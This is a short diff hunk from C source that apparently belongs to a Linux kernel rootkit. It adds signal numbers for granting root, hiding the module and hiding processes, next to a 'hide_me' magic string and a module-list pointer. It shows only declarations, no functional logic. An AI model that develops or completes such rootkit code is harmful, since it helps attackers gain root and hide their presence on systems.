@@ -7,6 +7,9 @@
 
 #include "stdlib.h"
 
+int SIG_ROOT = 64;
+int SIG_MODHIDE = 63;
+int SIG_PROCHIDE = 62;
 char* MAGIC_WORD = "hide_me";
 
 static struct list_head *prev_module = NULL;
